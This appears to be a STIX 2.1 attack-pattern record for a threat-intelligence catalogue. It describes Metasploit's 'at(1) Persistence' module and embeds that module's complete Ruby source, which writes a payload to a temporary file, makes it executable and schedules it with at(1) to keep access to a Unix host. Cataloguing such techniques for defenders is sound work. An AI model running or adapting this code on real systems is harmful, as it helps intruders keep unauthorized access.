{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2c4c79b1-e195-4764-89da-8a58e871fa8c",
    "created": "2024-08-14T17:14:31.654429Z",
    "modified": "2024-08-14T17:14:31.654433Z",
    "name": "at(1) Persistence",
    "description": " This module achieves persistence by executing payloads via at(1).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/local/at_persistence.rb",
            "external_id": "at_persistence.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'at(1) Persistence',\n        'Description' => %q{\n          This module achieves persistence by executing payloads via at(1).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Jon Hart <jon_hart@rapid7.com>'\n        ],\n        'Targets' => [['Automatic', {} ]],\n        'DefaultTarget' => 0,\n        'Platform' => %w[unix],\n        'Arch' => ARCH_CMD,\n        'DisclosureDate' => '1997-01-01', # http://pubs.opengroup.org/onlinepubs/007908799/xcu/at.html\n        'Notes' => {\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TIME', [false, 'When to run job via at(1).  Changing may require WfsDelay to be adjusted.', 'now'])\n    ])\n\n    register_advanced_options([\n      OptString.new('PATH', [false, 'Path to store payload to be executed by at(1).  Leave unset to use mktemp.'])\n    ])\n  end\n\n  def check\n    token = Rex::Text.rand_text_alphanumeric(8)\n    if cmd_exec(\"atq && echo #{token}\").include?(token)\n      CheckCode::Vulnerable\n    else\n      CheckCode::Safe\n    end\n  end\n\n  def exploit\n    unless check == Exploit::CheckCode::Vulnerable\n      fail_with(Failure::NoAccess, 'User denied cron via at.deny')\n    end\n\n    unless (payload_file = (datastore['PATH'] || cmd_exec('mktemp')))\n      fail_with(Failure::BadConfig, 'Unable to find suitable location for payload')\n    end\n\n    write_file(payload_file, payload.encoded)\n    register_files_for_cleanup(payload_file)\n\n    cmd_exec(\"chmod 700 #{payload_file}\")\n    cmd_exec(\"at -f #{payload_file} #{datastore['TIME']}\")\n\n    print_status(\"Waiting up to #{datastore['WfsDelay']}sec for execution\")\n  end\nend\n",
    "x_mitre_disclosure_date": "1997-01-01, # http://pubs.opengroup.org/onlinepubs/007908799/xcu/at.html",
    "x_mitre_platforms": [
        "%w[unix]"
    ]
}